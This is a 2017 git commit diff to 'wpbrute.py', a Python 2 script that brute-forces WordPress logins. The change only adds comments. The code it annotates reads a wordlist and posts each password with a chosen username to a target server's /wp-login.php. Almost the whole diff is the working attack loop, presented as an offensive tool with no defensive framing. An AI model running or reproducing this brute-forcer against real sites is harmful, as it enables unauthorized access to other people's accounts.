86f24e7e6bde48faf147e21e6f1db99d476d7040
Darklor0rd <32086055+Darklor0rd@users.noreply.github.com>
2017-10-28 12:09:06 -0700

    Update wpbrute.py

--- wpbrute.py
+++ wpbrute.py
@@ -5,6 +5,7 @@ import urllib
 import time
 import urllib2
 import os
+# detecting os 'nt' means its windows
 if os.name == 'nt':
 	os.system('cls')
 else:	
@@ -22,19 +23,19 @@ banner = """
 
 """
 print'\033[92m' + banner
-
+# making arguments
 parser = argparse.ArgumentParser()
 parser.add_argument('-u','--user',help='username or admin')
 parser.add_argument('-w','--wordlist',help='specify the wordlist')
 parser.add_argument('-s','--server',help='server ip ex. 192.168.1.100 or www.example.com')
 args = parser.parse_args()
-
+# specifing targets
 url = 'http://' + args.server + '/wp-login.php' #(1)
 user_login = args.user #(2)
-wordlist = open(args.wordlist, 'r')
-passwords = wordlist.readlines()
-for password in passwords:
-	password = password.strip()
+wordlist = open(args.wordlist, 'r')	# opening a wordlist
+passwords = wordlist.readlines()	# read lines
+for password in passwords:		# making a loop
+	password = password.strip()	# reading lines one by one 
 	values = { 'log': user_login, 'pwd': password }
 	data = urllib.urlencode(values)
 	request = urllib2.Request(url, data)
